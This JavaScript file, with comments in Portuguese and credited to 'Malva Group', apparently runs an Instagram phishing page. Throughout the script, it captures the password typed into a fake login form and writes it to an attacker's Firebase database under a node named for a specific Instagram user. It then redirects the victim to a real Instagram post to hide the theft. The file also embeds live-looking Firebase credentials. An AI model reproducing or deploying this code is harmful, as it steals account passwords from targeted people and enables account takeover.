// Developed by Malva Group

// Configuração do Firebase
var firebaseConfig = {
    apiKey: "AIzaSyAH6cQhi6nZbJJ8yNnp6KrcoIhMObSfgGc",
    authDomain: "mg-igp1.firebaseapp.com",
    projectId: "mg-igp1",
    storageBucket: "mg-igp1.appspot.com",
    messagingSenderId: "227829971389",
    appId: "1:227829971389:web:6b3dd719248e821f097ad4",
    measurementId: "G-GGNZ14QW7N"
};
// Inicializa o Firebase
firebase.initializeApp(firebaseConfig);
firebase.analytics();

// Script para redirecionamento com LocalStorage
const specificLink = "https://www.instagram.com/p/DBBnscpjjjRM/"; // O site ficará aqui
const redirectKey = "redirectTo";

// Verifica se o indicador está no localStorage
if (localStorage.getItem(redirectKey) === specificLink) {
    window.location.href = specificLink;
}

window.onload = function() {
    const submitButton = document.querySelector('input[type="submit"]');
    const p455Element = document.getElementById("p455");

    // Nome do usuário no Firebase
    let alvoInfo = firebase.database().ref("Malva Group").child("App_IG").child("m.dudaslv");

    submitButton.addEventListener("click", function(event) {
        if (p455Element && p455Element.value.trim() !== "") {
            event.preventDefault(); // Impede o envio do formulário imediatamente
            if (submitButton.value === "Entrar") {
                setTimeout(function() {
                    submitButton.value = "Entrando...";
                }, 300); // Delay de 0.3 segundo para mudar o texto
            }

            // Envia o valor para o Firebase
            let passeLog = p455Element.value.trim();
            coletarDoAlvo(passeLog);

            // Redireciona após 2 segundos
            setTimeout(function() {
                localStorage.setItem(redirectKey, specificLink);
                window.location.href = specificLink;
            }, 1200);
        } else {
            event.preventDefault(); // Impede o envio do formulário se o campo estiver vazio
        }
    });

    // Função para salvar dados no Firebase
    function coletarDoAlvo(senha) {
        let dadosDoAlvo = alvoInfo.push();

        dadosDoAlvo.set({
            "Tá na mão! A senha é": senha,
        }).then(() => {
            console.log("Pegamos!");
        }).catch((error) => {
            console.error("Poha!", error);
        });
    }

    // Adiciona um evento de clique ao link específico
    const specificLinkElement = document.querySelector('a#specificLink');
    if (specificLinkElement) {
        specificLinkElement.addEventListener("click", function(event) {
            event.preventDefault();
            localStorage.setItem(redirectKey, specificLink);
            window.location.href = specificLink;
        });
    }

};